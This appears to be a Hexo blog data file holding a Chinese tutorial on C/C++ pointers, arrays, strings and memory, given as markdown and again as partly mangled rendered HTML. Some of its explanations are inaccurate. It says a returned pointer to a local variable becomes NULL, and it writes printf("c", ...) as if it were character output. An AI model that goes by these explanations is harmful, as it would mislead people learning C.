//上面打印的地址都是一样的,所有的\"aaa\"就是字符常量,放在内存中的data区域,字符常量区\n\n        char buf[] = \"aaa\";//这个字符数组所指向的字符串,并没有放在data区域,而是在栈里面\n        char *p1 = \"hello\";//这个是字符常量,值是不可以被修改的\n        char buf[] = \"hello\";//这个是字符指针数组,值是可以被修改的\n        char p1[100]= \"hello\";//正确\n        p1 = \"hello\";//错误\n        char p2[100];p2=\"hello\";//错误,因为数组名是常量.\n        char p3[100];strcpy(p3,\"hello\");等价于 char p1[100]= \"hello\";\n```\n\n# 数组,指针,符号含义\n* 1. 使用 *p , *(p+0), p[0] 都是代表了取出内存块里面的值, *(p+1)表示: *(指针运算),这都是表达的我要直接操作内存块,而不是操作指针(内存首地址)\n* 2. 使用 p+0 等运算,都是对指针 p ,内存首地址进行的运算,\n* 3. 一维数组的三种操作方式 \n        ```\n                //数组有3种操作方式\n                struct Student s[3] ={};\n                //直接操作内存块\n                s[0].age = 15;\n                strcpy(s[0].name, \"mike\");\n                s[0].score = 15;\n                //直接操作内存块\n                (*(s+1)).age = 15;\n                strcpy((*(s+1)).name, \"mike\");\n                (*(s+1)).score = 15;\n\n                //操作内存首地址\n                (s+2)->age = 15;\n                strcpy((s+2)->name, \"mike\");\n                (s+2)->score = 15;\n\n                //指针的写法\n                struct Student * p = &s[0];// = s; 2种写法一个意思\n                //直接操作内存块\n                p[0].age = 15;\n                strcpy(p[0].name, \"mike\");\n                p[0].score = 15;\n                //直接操作内存块\n                (*(p+1)).age = 15;\n                strcpy((*(p+1)).name, \"mike\");\n                (*(p+1)).score = 15;\n\n                //操作内存首地址\n                (p+2)->age = 15;\n                strcpy((p+2)->name, \"mike\");\n                (p+2)->score = 15;\n        ```\n\n# 内存概念以及管理\n* 1. 简单的 int a; 这句代码已经被分配了内存首地址与内存块,而不是单纯的什么都没有.\n* 2. 简单的 int* p; 这句代码种 int* 合起来是一种类型,也已经分配了内存首地址与内存块,只不过内存首地址是指针变量p的内存首地址,内存块是保存指针地址(内存首地址),无法保存其他类型(int float struct ... 的值).","source":"_posts/Pointer/指针.md","raw":"---\ntitle: C/C++指针详解\ndate: 2020-05-08 11:41:32\ncategories:\n- 指针\ntags:\n- 指针\n---\n\n![指针](指针.png)\n\n# 基础概念\n\n* 1. 1个字节就会有一个内存首地址,1个字节就是一个内存块.取地址专指取内存块的首地址.内存的最小单位就是1个字节.内存块:存储的就是值,例如20,\"1111\"等可以让我们直接使用的值;\n* 2. 变量定义时即分配内存,按照类型分配内存大小.\n        ```\n        char ch;//这个写法就在内存里面分配了1字节的大小,是在运行时已经分配了,但是没有用到而已,分配到哪里也不需要用户关心.\n        int a;//分配4字节\n        ```\n* 3. 内存首地址:存储的就是类似于一个数组的下标,只不过这个下标被编译器定义了,编译器定义它,不告诉你,但是你要知道它最大(指针的大小)就是32位或者64位,32位机器使用4字节存储指针,64位机器使用8字节存储指针.\n* 4. 内存首地址不是存储在内存块里面的,是CPU总线计算出来的,按照十进制表示:一般是 0-2的多少次方大小;可以使用十进制,二进制,八进制,十六进制表示.每次取地址,就计算出来这个内存首地址;内存块里面也可以存储内存首地址(也就是指针),因为内存首地址可以用十进制表示,也就是说指针是个十进制的数字而已,没有特别神奇的存储格式,仅仅是指针的含义与规则比较特殊.\n* 5. 可以根据内存首地址找到对应的内存块,叫做寻址;*p(寻址)操作的是内存首地址(指针)所指向的内存块\n* 6. 要把 char /int /float 等等 和 char* /int* /float* 等等类型看作是数据类型即可,int* 这个类型的优先级大于 int 的优先级\n* 7. ' * '号的意义\n        > 1,定义变量时,' * ' 代表的是类型(例如: int* p = 0x2498;p 就是指针类型 int* ,int是类型,int* 也是类型)        \n        > 2,在使用变量时,*代表操作指针所指向的内存.意思就是 *p 指向的就是p指针变量存储的内存首地址的内存块的值.         \n        > 3,' * '号在等号左边(int* p = 0xxxx;)表示在定义一块内存,' * '号操作必须操作指针变量,类型+'*'表示一个整体         \n        > 4,' * '号在等号右边,表示在操作内存块里面的值,哪个内存块,取决于指针变量里面存储的指针的值.*+指针变量表示一个整体         \n* 8. & 符号表示什么,如果&在指针变量之前表示什么,如果&在变量之前表示什么\n* 9. 变量:变量只要定义,就会分配这个变量所对应的内存首地址以及内存块,如果没有赋值,则内存块里面没有值而已,但是内存首地址一定是被分配了而且存在的.\n* 10. 指针:指针变量的值,就是内存首地址\n* 11. 指针变量:存储指针的一个变量,和普通变量一样\n* 12. 野指针:这个指针变量保存了一个没有意义(非法)的内存首地址,对野指针变量本身进行赋值,修改等没有问题,但是一旦对指针变量的值进行取地址操作,就会出现问题,因为是非法的.\n* 13. 空指针:给指针变量赋值位NULL,NULL就是个0.\n* 14. 万能指针使用的时候,需要将其转换为本身类型才能使用,例如 void* 转为 int* 才能使用\n* 14. 指针运算是和其类型相关的,加减乘除的时候都要附加类型大小才可以\n* 15. 数组的变量本身就是个内存首地址,int a[10]; a 本身就是个内存首地址 ;  所以 int* p = a; 是没有问题的\n* 16. 只要是指针 * 与 [] 对于取值是一个意思. *(p + i) 与 p[i] 是相等的,也就是    *(p+i) = p[i]\n\n\n\n# 套娃\n\n* 只要记住,内存首地址是 &变量 ,并且只能获取值 ;内存块是 *变量  可以获取值,也可以赋予值;内存首地址本质是纯数字;内存块本质也是纯数字,但是有其他表现形式;\n\n* 一级套娃\n```\nint a;\nint* p = &a; \n```\n* 二级套娃\n```\nint a;\nint* p = &a; \nint** q = &p; \n\n```\n* 三级套娃\n```\nint a;\nint* p = &a; \nint** q = &p; \nint*** w = &q; \n\n```\n* 多级套娃\n```\nint a;\nint* p = &a; \nint** q = &p; \nint*** w = &q; \nint**** e = &w; \n\n```\n\n# 函数传参\n* 1. 函数传参都是将变量内存块里面的值拷贝一份传输过去,指针(内存首地址)拷贝一份,就能连接到函数内与函数外的数据,就会方便很多.\n下面是错误例子:\n```\n        //void printf_Array(int *a) //2种写法等价,对编译器而言,没有任何区别,编译器都是当作 int * 类型处理\n        void printf_Array(int a[])\n        {\n                for (size_t i = 0; i < sizeof(a) / sizeof(a[0]); i++) {\n                        printf(\"%d,\", a[i]);\n                }\n                printf(\"\\n\");\n        }\n        int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n        printf_Array(array);\n        //这个地方传输的是a这个变量内存块里面的值,也就是数组第一个元素的内存首地址,而不是整个数组\n        //形参中的数组根本就不是数组,就是一个指针变量(内存首地址)\n```\n正确的例子是:\n```\n        void printf_Array(int *array,int length)\n        {\n                for (int i = 0; i < length; i++) {\n                        printf(\"%d,\", array[i]);\n                }\n                printf(\"\\n\");\n        }\n        int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n        printf_Array(array,(sizeof(array) / sizeof(array[0])));\n\n```\n>结论:数组在作为函数的形参传递过程中,需要传递首地址,还要传递数组长度,函数才可以正确将数组解析出来.\n> 1. 形参中的数组不是数组,是普通的指针变量\n> 2. 形参数组: int a[10000],int a[],int * a,对编译器没有区别,编译器都是当作 int * 类型来处理\n> 3. 形参中的数组和非形参中的数组的区别:形参中的数组是指针变量,非形参数组就是数组\n\n* 2. 二维数组不是二级指针,指针数组才是二级指针\n\n# 指针数组和数组指针\n\n* 1. 指针数组,是数组,里面每个元素是指针.写法:\n```\nchar** a; char* a[];//这个叫做指针数组,不是叫做二维数组\n```\n* 2. 数组指针,是指针,指向数组的指针.\n```\n```\n* 3. 指针函数,是函数;错误案例,代码会直接报错,因为pointer_Function执行完毕会释放里面的变量,指针指向的值也被回收了,然后指针就指向了一个空的内存首地址,指针指向了 NULL,变成了空指针:\n```\nint * pointer_Function()\n{\n    int a = 200;\n    return &a;\n}\nvoid paFunction3()\n{\n    int* pf = pointer_Function();\n    printf(\"当前指针的内存首地址%p  当前指针内存块的值:%p  当前指针内存块所指向的内存的值:%d\\n\",&pf,pf,*pf);\n}\n\n```\n\n* 4. 函数指针,是指针\n\n* 5. 字符指针,这个是比较特殊的\n```\nchar str[] = \"hello\";\nprintf(\"%s\\n\",str);//里面是重写了输出方法\n//是下面的输出方式\nint i = 0;\nwhile(str[i]!= '\\0')\n{\n        printf(\"c\",str[i]);\n        i++;\n}\n//str本身还是首元素的内存首地址,只是输出比较特殊而已.本质还是个指针\nchar buf[100];\nchar* p = buf;\n\nstrcpy(p,\"wqrywegw\");//不是给p本身拷贝内容,而是给p指向的内存块拷贝内容.\n\n```\n\n\n# 字符串结束符\n\n0 数字0 与 '\\0' 在字符串中是一样的,都是结束符\n'\\0' accsi 的结束符,与数字0在字符串中是一样的\n'0' 字符0 ,在accsi中的数字表示是 48\n\nchar a[] = {'a','b'};\nprintf(\"%s\",a);//乱码,没有结束符\n\nchar a[10] = {'a','b'};\nprintf(\"%s\",a);//正常,自动补0\n\nchar a[] = {'a','b',0};\nchar a[] = {'a','b','\\0'};\nprintf(\"%s\",a);//正常\n\nchar a[] = {'a','b''0'};\nprintf(\"%s\",a);//乱码,没有结束符\n\nchar buf[] = \"hello\";\nprintf(\"%s\",buf);//正常,以字符串初始化,自动隐藏结束符'\\0'\n\n# 字符常量和字符指针数组\n```\n        void fun()\n        {\n                 printf(\"%p\\n\",\"aaa\");\n        }\n        printf(\"%p\\n\",\"aaa\");\n        printf(\"%p\\n\",\"aaa\");\n        fun();\n        printf(\"%s\\n\",\"aaa\"+1);//这种写法是正常的,因为这是将\"aaa\"当成内存首地址来使用的,类型是 char\n        printf(\"%c\\n\",*(\"aaa\"));//取出首元素\n        //上面打印的地址都是一样的,所有的\"aaa\"就是字符常量,放在内存中的data区域,字符常量区\n\n        char buf[] = \"aaa\";//这个字符数组所指向的字符串,并没有放在data区域,而是在栈里面\n        char *p1 = \"hello\";//这个是字符常量,值是不可以被修改的\n        char buf[] = \"hello\";//这个是字符指针数组,值是可以被修改的\n        char p1[100]= \"hello\";//正确\n        p1 = \"hello\";//错误\n        char p2[100];p2=\"hello\";//错误,因为数组名是常量.\n        char p3[100];strcpy(p3,\"hello\");等价于 char p1[100]= \"hello\";\n```\n\n# 数组,指针,符号含义\n* 1. 使用 *p , *(p+0), p[0] 都是代表了取出内存块里面的值, *(p+1)表示: *(指针运算),这都是表达的我要直接操作内存块,而不是操作指针(内存首地址)\n* 2. 使用 p+0 等运算,都是对指针 p ,内存首地址进行的运算,\n* 3. 一维数组的三种操作方式 \n        ```\n                //数组有3种操作方式\n                struct Student s[3] ={};\n                //直接操作内存块\n                s[0].age = 15;\n                strcpy(s[0].name, \"mike\");\n                s[0].score = 15;\n                //直接操作内存块\n                (*(s+1)).age = 15;\n                strcpy((*(s+1)).name, \"mike\");\n                (*(s+1)).score = 15;\n\n                //操作内存首地址\n                (s+2)->age = 15;\n                strcpy((s+2)->name, \"mike\");\n                (s+2)->score = 15;\n\n                //指针的写法\n                struct Student * p = &s[0];// = s; 2种写法一个意思\n                //直接操作内存块\n                p[0].age = 15;\n                strcpy(p[0].name, \"mike\");\n                p[0].score = 15;\n                //直接操作内存块\n                (*(p+1)).age = 15;\n                strcpy((*(p+1)).name, \"mike\");\n                (*(p+1)).score = 15;\n\n                //操作内存首地址\n                (p+2)->age = 15;\n                strcpy((p+2)->name, \"mike\");\n                (p+2)->score = 15;\n        ```\n\n# 内存概念以及管理\n* 1. 简单的 int a; 这句代码已经被分配了内存首地址与内存块,而不是单纯的什么都没有.\n* 2. 简单的 int* p; 这句代码种 int* 合起来是一种类型,也已经分配了内存首地址与内存块,只不过内存首地址是指针变量p的内存首地址,内存块是保存指针地址(内存首地址),无法保存其他类型(int float struct ... 的值).","slug":"Pointer/指针","published":1,"updated":"2020-08-27T06:20:43.531Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cy3000r2gk7fubacr5t","content":"<p><img src=\"/2020/05/08/Pointer/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88.png\" alt=\"指针\"></p>\n<h1 id=\"基础概念\"><a href=\"#基础概念\" class=\"headerlink\" title=\"基础概念\"></a>基础概念</h1><ul>\n<li><ol>\n<li>1个字节就会有一个内存首地址,1个字节就是一个内存块.取地址专指取内存块的首地址.内存的最小单位就是1个字节.内存块:存储的就是值,例如20,”1111”等可以让我们直接使用的值;</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>变量定义时即分配内存,按照类型分配内存大小.<pre><code>   char ch;//这个写法就在内存里面分配了1字节的大小,是在运行时已经分配了,但是没有用到而已,分配到哪里也不需要用户关心.\n   int a;//分配4字节</code></pre></li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>内存首地址:存储的就是类似于一个数组的下标,只不过这个下标被编译器定义了,编译器定义它,不告诉你,但是你要知道它最大(指针的大小)就是32位或者64位,32位机器使用4字节存储指针,64位机器使用8字节存储指针.</li>\n</ol>\n</li>\n<li><ol start=\"4\">\n<li>内存首地址不是存储在内存块里面的,是CPU总线计算出来的,按照十进制表示:一般是 0-2的多少次方大小;可以使用十进制,二进制,八进制,十六进制表示.每次取地址,就计算出来这个内存首地址;内存块里面也可以存储内存首地址(也就是指针),因为内存首地址可以用十进制表示,也就是说指针是个十进制的数字而已,没有特别神奇的存储格式,仅仅是指针的含义与规则比较特殊.</li>\n</ol>\n</li>\n<li><ol start=\"5\">\n<li>可以根据内存首地址找到对应的内存块,叫做寻址;*p(寻址)操作的是内存首地址(指针)所指向的内存块</li>\n</ol>\n</li>\n<li><ol start=\"6\">\n<li>要把 char /int /float 等等 和 char* /int* /float* 等等类型看作是数据类型即可,int* 这个类型的优先级大于 int 的优先级</li>\n</ol>\n</li>\n<li><ol start=\"7\">\n<li>‘ * ‘号的意义<blockquote>\n<p>1,定义变量时,’ * ‘ 代表的是类型(例如: int* p = 0x2498;p 就是指针类型 int* ,int是类型,int* 也是类型)<br>2,在使用变量时,<em>代表操作指针所指向的内存.意思就是 *p 指向的就是p指针变量存储的内存首地址的内存块的值.<br>3,’ * ‘号在等号左边(int</em> p = 0xxxx;)表示在定义一块内存,’ * ‘号操作必须操作指针变量,类型+’<em>‘表示一个整体<br>4,’ * ‘号在等号右边,表示在操作内存块里面的值,哪个内存块,取决于指针变量里面存储的指针的值.</em>+指针变量表示一个整体         </p>\n</blockquote>\n</li>\n</ol>\n</li>\n<li><ol start=\"8\">\n<li>&amp; 符号表示什么,如果&amp;在指针变量之前表示什么,如果&amp;在变量之前表示什么</li>\n</ol>\n</li>\n<li><ol start=\"9\">\n<li>变量:变量只要定义,就会分配这个变量所对应的内存首地址以及内存块,如果没有赋值,则内存块里面没有值而已,但是内存首地址一定是被分配了而且存在的.</li>\n</ol>\n</li>\n<li><ol start=\"10\">\n<li>指针:指针变量的值,就是内存首地址</li>\n</ol>\n</li>\n<li><ol start=\"11\">\n<li>指针变量:存储指针的一个变量,和普通变量一样</li>\n</ol>\n</li>\n<li><ol start=\"12\">\n<li>野指针:这个指针变量保存了一个没有意义(非法)的内存首地址,对野指针变量本身进行赋值,修改等没有问题,但是一旦对指针变量的值进行取地址操作,就会出现问题,因为是非法的.</li>\n</ol>\n</li>\n<li><ol start=\"13\">\n<li>空指针:给指针变量赋值位NULL,NULL就是个0.</li>\n</ol>\n</li>\n<li><ol start=\"14\">\n<li>万能指针使用的时候,需要将其转换为本身类型才能使用,例如 void* 转为 int* 才能使用</li>\n</ol>\n</li>\n<li><ol start=\"14\">\n<li>指针运算是和其类型相关的,加减乘除的时候都要附加类型大小才可以</li>\n</ol>\n</li>\n<li><ol start=\"15\">\n<li>数组的变量本身就是个内存首地址,int a[10]; a 本身就是个内存首地址 ;  所以 int* p = a; 是没有问题的</li>\n</ol>\n</li>\n<li><ol start=\"16\">\n<li>只要是指针 * 与 [] 对于取值是一个意思. *(p + i) 与 p[i] 是相等的,也就是    *(p+i) = p[i]</li>\n</ol>\n</li>\n</ul>\n<h1 id=\"套娃\"><a href=\"#套娃\" class=\"headerlink\" title=\"套娃\"></a>套娃</h1><ul>\n<li><p>只要记住,内存首地址是 &amp;变量 ,并且只能获取值 ;内存块是 *变量  可以获取值,也可以赋予值;内存首地址本质是纯数字;内存块本质也是纯数字,但是有其他表现形式;</p>\n</li>\n<li><p>一级套娃</p>\n<pre><code>int a;\nint* p = &amp;a; </code></pre></li>\n<li><p>二级套娃</p>\n<pre><code>int a;\nint* p = &amp;a; \nint** q = &amp;p; \n</code></pre></li>\n</ul>\n<pre><code>* 三级套娃</code></pre><p>int a;<br>int* p = &a;<br>int** q = &p;<br>int*** w = &q; </p>\n<pre><code>* 多级套娃</code></pre><p>int a;<br>int* p = &a;<br>int** q = &p;<br>int<strong>* w = &q;<br>int**</strong> e = &w; </p>\n<pre><code>\n# 函数传参\n* 1. 函数传参都是将变量内存块里面的值拷贝一份传输过去,指针(内存首地址)拷贝一份,就能连接到函数内与函数外的数据,就会方便很多.\n下面是错误例子:</code></pre><pre><code>    //void printf_Array(int *a) //2种写法等价,对编译器而言,没有任何区别,编译器都是当作 int * 类型处理\n    void printf_Array(int a[])\n    {\n            for (size_t i = 0; i &lt; sizeof(a) / sizeof(a[0]); i++) {\n                    printf(&quot;%d,&quot;, a[i]);\n            }\n            printf(&quot;\\n&quot;);\n    }\n    int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n    printf_Array(array);\n    //这个地方传输的是a这个变量内存块里面的值,也就是数组第一个元素的内存首地址,而不是整个数组\n    //形参中的数组根本就不是数组,就是一个指针变量(内存首地址)</code></pre><pre><code>正确的例子是:</code></pre><pre><code>    void printf_Array(int *array,int length)\n    {\n            for (int i = 0; i &lt; length; i++) {\n                    printf(&quot;%d,&quot;, array[i]);\n            }\n            printf(&quot;\\n&quot;);\n    }\n    int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n    printf_Array(array,(sizeof(array) / sizeof(array[0])));</code></pre><pre><code>&gt;结论:数组在作为函数的形参传递过程中,需要传递首地址,还要传递数组长度,函数才可以正确将数组解析出来.\n&gt; 1. 形参中的数组不是数组,是普通的指针变量\n&gt; 2. 形参数组: int a[10000],int a[],int * a,对编译器没有区别,编译器都是当作 int * 类型来处理\n&gt; 3. 形参中的数组和非形参中的数组的区别:形参中的数组是指针变量,非形参数组就是数组\n\n* 2. 二维数组不是二级指针,指针数组才是二级指针\n\n# 指针数组和数组指针\n\n* 1. 指针数组,是数组,里面每个元素是指针.写法:</code></pre><p>char<em>* a; char</em> a[];//这个叫做指针数组,不是叫做二维数组</p>\n<pre><code>* 2. 数组指针,是指针,指向数组的指针.</code></pre><pre><code>* 3. 指针函数,是函数;错误案例,代码会直接报错,因为pointer_Function执行完毕会释放里面的变量,指针指向的值也被回收了,然后指针就指向了一个空的内存首地址,指针指向了 NULL,变成了空指针:</code></pre><p>int * pointer_Function()<br>{<br>    int a = 200;<br>    return &a;<br>}<br>void paFunction3()<br>{<br>    int* pf = pointer_Function();<br>    printf(“当前指针的内存首地址%p  当前指针内存块的值:%p  当前指针内存块所指向的内存的值:%d\\n”,&amp;pf,pf,*pf);<br>}</p>\n<pre><code>\n* 4. 函数指针,是指针\n\n* 5. 字符指针,这个是比较特殊的</code></pre><p>char str[] = “hello”;<br>printf(“%s\\n”,str);//里面是重写了输出方法<br>//是下面的输出方式<br>int i = 0;<br>while(str[i]!= ‘\\0’)<br>{<br>        printf(“c”,str[i]);<br>        i++;<br>}<br>//str本身还是首元素的内存首地址,只是输出比较特殊而已.本质还是个指针<br>char buf[100];<br>char* p = buf;</p>\n<p>strcpy(p,”wqrywegw”);//不是给p本身拷贝内容,而是给p指向的内存块拷贝内容.</p>\n<pre><code>\n\n# 字符串结束符\n\n0 数字0 与 &#39;\\0&#39; 在字符串中是一样的,都是结束符\n&#39;\\0&#39; accsi 的结束符,与数字0在字符串中是一样的\n&#39;0&#39; 字符0 ,在accsi中的数字表示是 48\n\nchar a[] = {&#39;a&#39;,&#39;b&#39;};\nprintf(&quot;%s&quot;,a);//乱码,没有结束符\n\nchar a[10] = {&#39;a&#39;,&#39;b&#39;};\nprintf(&quot;%s&quot;,a);//正常,自动补0\n\nchar a[] = {&#39;a&#39;,&#39;b&#39;,0};\nchar a[] = {&#39;a&#39;,&#39;b&#39;,&#39;\\0&#39;};\nprintf(&quot;%s&quot;,a);//正常\n\nchar a[] = {&#39;a&#39;,&#39;b&#39;&#39;0&#39;};\nprintf(&quot;%s&quot;,a);//乱码,没有结束符\n\nchar buf[] = &quot;hello&quot;;\nprintf(&quot;%s&quot;,buf);//正常,以字符串初始化,自动隐藏结束符&#39;\\0&#39;\n\n# 字符常量和字符指针数组</code></pre><pre><code>    void fun()\n    {\n             printf(&quot;%p\\n&quot;,&quot;aaa&quot;);\n    }\n    printf(&quot;%p\\n&quot;,&quot;aaa&quot;);\n    printf(&quot;%p\\n&quot;,&quot;aaa&quot;);\n    fun();\n    printf(&quot;%s\\n&quot;,&quot;aaa&quot;+1);//这种写法是正常的,因为这是将&quot;aaa&quot;当成内存首地址来使用的,类型是 char\n    printf(&quot;%c\\n&quot;,*(&quot;aaa&quot;));//取出首元素\n    //上面打印的地址都是一样的,所有的&quot;aaa&quot;就是字符常量,放在内存中的data区域,字符常量区\n\n    char buf[] = &quot;aaa&quot;;//这个字符数组所指向的字符串,并没有放在data区域,而是在栈里面\n    char *p1 = &quot;hello&quot;;//这个是字符常量,值是不可以被修改的\n    char buf[] = &quot;hello&quot;;//这个是字符指针数组,值是可以被修改的\n    char p1[100]= &quot;hello&quot;;//正确\n    p1 = &quot;hello&quot;;//错误\n    char p2[100];p2=&quot;hello&quot;;//错误,因为数组名是常量.\n    char p3[100];strcpy(p3,&quot;hello&quot;);等价于 char p1[100]= &quot;hello&quot;;</code></pre><p>```</p>\n<h1 id=\"数组-指针-符号含义\"><a href=\"#数组-指针-符号含义\" class=\"headerlink\" title=\"数组,指针,符号含义\"></a>数组,指针,符号含义</h1><ul>\n<li><ol>\n<li>使用 *p , *(p+0), p[0] 都是代表了取出内存块里面的值, *(p+1)表示: *(指针运算),这都是表达的我要直接操作内存块,而不是操作指针(内存首地址)</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>使用 p+0 等运算,都是对指针 p ,内存首地址进行的运算,</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li><p>一维数组的三种操作方式 </p>\n<pre><code>           //数组有3种操作方式\n           struct Student s[3] ={};\n           //直接操作内存块\n           s[0].age = 15;\n           strcpy(s[0].name, &quot;mike&quot;);\n           s[0].score = 15;\n           //直接操作内存块\n           (*(s+1)).age = 15;\n           strcpy((*(s+1)).name, &quot;mike&quot;);\n           (*(s+1)).score = 15;\n\n           //操作内存首地址\n           (s+2)-&gt;age = 15;\n           strcpy((s+2)-&gt;name, &quot;mike&quot;);\n           (s+2)-&gt;score = 15;\n\n           //指针的写法\n           struct Student * p = &amp;s[0];// = s; 2种写法一个意思\n           //直接操作内存块\n           p[0].age = 15;\n           strcpy(p[0].name, &quot;mike&quot;);\n           p[0].score = 15;\n           //直接操作内存块\n           (*(p+1)).age = 15;\n           strcpy((*(p+1)).name, &quot;mike&quot;);\n           (*(p+1)).score = 15;\n\n           //操作内存首地址\n           (p+2)-&gt;age = 15;\n           strcpy((p+2)-&gt;name, &quot;mike&quot;);\n           (p+2)-&gt;score = 15;</code></pre></li>\n</ol>\n</li>\n</ul>\n<h1 id=\"内存概念以及管理\"><a href=\"#内存概念以及管理\" class=\"headerlink\" title=\"内存概念以及管理\"></a>内存概念以及管理</h1><ul>\n<li><ol>\n<li>简单的 int a; 这句代码已经被分配了内存首地址与内存块,而不是单纯的什么都没有.</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>简单的 int* p; 这句代码种 int* 合起来是一种类型,也已经分配了内存首地址与内存块,只不过内存首地址是指针变量p的内存首地址,内存块是保存指针地址(内存首地址),无法保存其他类型(int float struct … 的值).</li>\n</ol>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"/2020/05/08/Pointer/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88.png\" alt=\"指针\"></p>\n<h1 id=\"基础概念\"><a href=\"#基础概念\" class=\"headerlink\" title=\"基础概念\"></a>基础概念</h1><ul>\n<li><ol>\n<li>1个字节就会有一个内存首地址,1个字节就是一个内存块.取地址专指取内存块的首地址.内存的最小单位就是1个字节.内存块:存储的就是值,例如20,”1111”等可以让我们直接使用的值;</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>变量定义时即分配内存,按照类型分配内存大小.<pre><code>   char ch;//这个写法就在内存里面分配了1字节的大小,是在运行时已经分配了,但是没有用到而已,分配到哪里也不需要用户关心.\n   int a;//分配4字节</code></pre></li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>内存首地址:存储的就是类似于一个数组的下标,只不过这个下标被编译器定义了,编译器定义它,不告诉你,但是你要知道它最大(指针的大小)就是32位或者64位,32位机器使用4字节存储指针,64位机器使用8字节存储指针.</li>\n</ol>\n</li>\n<li><ol start=\"4\">\n<li>内存首地址不是存储在内存块里面的,是CPU总线计算出来的,按照十进制表示:一般是 0-2的多少次方大小;可以使用十进制,二进制,八进制,十六进制表示.每次取地址,就计算出来这个内存首地址;内存块里面也可以存储内存首地址(也就是指针),因为内存首地址可以用十进制表示,也就是说指针是个十进制的数字而已,没有特别神奇的存储格式,仅仅是指针的含义与规则比较特殊.</li>\n</ol>\n</li>\n<li><ol start=\"5\">\n<li>可以根据内存首地址找到对应的内存块,叫做寻址;*p(寻址)操作的是内存首地址(指针)所指向的内存块</li>\n</ol>\n</li>\n<li><ol start=\"6\">\n<li>要把 char /int /float 等等 和 char* /int* /float* 等等类型看作是数据类型即可,int* 这个类型的优先级大于 int 的优先级</li>\n</ol>\n</li>\n<li><ol start=\"7\">\n<li>‘ * ‘号的意义<blockquote>\n<p>1,定义变量时,’ * ‘ 代表的是类型(例如: int* p = 0x2498;p 就是指针类型 int* ,int是类型,int* 也是类型)<br>2,在使用变量时,<em>代表操作指针所指向的内存.意思就是 *p 指向的就是p指针变量存储的内存首地址的内存块的值.<br>3,’ * ‘号在等号左边(int</em> p = 0xxxx;)表示在定义一块内存,’ * ‘号操作必须操作指针变量,类型+’<em>‘表示一个整体<br>4,’ * ‘号在等号右边,表示在操作内存块里面的值,哪个内存块,取决于指针变量里面存储的指针的值.</em>+指针变量表示一个整体         </p>\n</blockquote>\n</li>\n</ol>\n</li>\n<li><ol start=\"8\">\n<li>&amp; 符号表示什么,如果&amp;在指针变量之前表示什么,如果&amp;在变量之前表示什么</li>\n</ol>\n</li>\n<li><ol start=\"9\">\n<li>变量:变量只要定义,就会分配这个变量所对应的内存首地址以及内存块,如果没有赋值,则内存块里面没有值而已,但是内存首地址一定是被分配了而且存在的.</li>\n</ol>\n</li>\n<li><ol start=\"10\">\n<li>指针:指针变量的值,就是内存首地址</li>\n</ol>\n</li>\n<li><ol start=\"11\">\n<li>指针变量:存储指针的一个变量,和普通变量一样</li>\n</ol>\n</li>\n<li><ol start=\"12\">\n<li>野指针:这个指针变量保存了一个没有意义(非法)的内存首地址,对野指针变量本身进行赋值,修改等没有问题,但是一旦对指针变量的值进行取地址操作,就会出现问题,因为是非法的.</li>\n</ol>\n</li>\n<li><ol start=\"13\">\n<li>空指针:给指针变量赋值位NULL,NULL就是个0.</li>\n</ol>\n</li>\n<li><ol start=\"14\">\n<li>万能指针使用的时候,需要将其转换为本身类型才能使用,例如 void* 转为 int* 才能使用</li>\n</ol>\n</li>\n<li><ol start=\"14\">\n<li>指针运算是和其类型相关的,加减乘除的时候都要附加类型大小才可以</li>\n</ol>\n</li>\n<li><ol start=\"15\">\n<li>数组的变量本身就是个内存首地址,int a[10]; a 本身就是个内存首地址 ;  所以 int* p = a; 是没有问题的</li>\n</ol>\n</li>\n<li><ol start=\"16\">\n<li>只要是指针 * 与 [] 对于取值是一个意思. *(p + i) 与 p[i] 是相等的,也就是    *(p+i) = p[i]</li>\n</ol>\n</li>\n</ul>\n<h1 id=\"套娃\"><a href=\"#套娃\" class=\"headerlink\" title=\"套娃\"></a>套娃</h1><ul>\n<li><p>只要记住,内存首地址是 &amp;变量 ,并且只能获取值 ;内存块是 *变量  可以获取值,也可以赋予值;内存首地址本质是纯数字;内存块本质也是纯数字,但是有其他表现形式;</p>\n</li>\n<li><p>一级套娃</p>\n<pre><code>int a;\nint* p = &amp;a; </code></pre></li>\n<li><p>二级套娃</p>\n<pre><code>int a;\nint* p = &amp;a; \nint** q = &amp;p; \n</code></pre></li>\n</ul>\n<pre><code>* 三级套娃</code></pre><p>int a;<br>int* p = &a;<br>int** q = &p;<br>int*** w = &q; </p>\n<pre><code>* 多级套娃</code></pre><p>int a;<br>int* p = &a;<br>int** q = &p;<br>int<strong>* w = &q;<br>int**</strong> e = &w; </p>\n<pre><code>\n# 函数传参\n* 1. 函数传参都是将变量内存块里面的值拷贝一份传输过去,指针(内存首地址)拷贝一份,就能连接到函数内与函数外的数据,就会方便很多.\n下面是错误例子:</code></pre><pre><code>    //void printf_Array(int *a) //2种写法等价,对编译器而言,没有任何区别,编译器都是当作 int * 类型处理\n    void printf_Array(int a[])\n    {\n            for (size_t i = 0; i &lt; sizeof(a) / sizeof(a[0]); i++) {\n                    printf(&quot;%d,&quot;, a[i]);\n            }\n            printf(&quot;\\n&quot;);\n    }\n    int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n    printf_Array(array);\n    //这个地方传输的是a这个变量内存块里面的值,也就是数组第一个元素的内存首地址,而不是整个数组\n    //形参中的数组根本就不是数组,就是一个指针变量(内存首地址)</code></pre><pre><code>正确的例子是:</code></pre><pre><code>    void printf_Array(int *array,int length)\n    {\n            for (int i = 0; i &lt; length; i++) {\n                    printf(&quot;%d,&quot;, array[i]);\n            }\n            printf(&quot;\\n&quot;);\n    }\n    int array[] = {  7, 79, 465,  65, -345, -346, 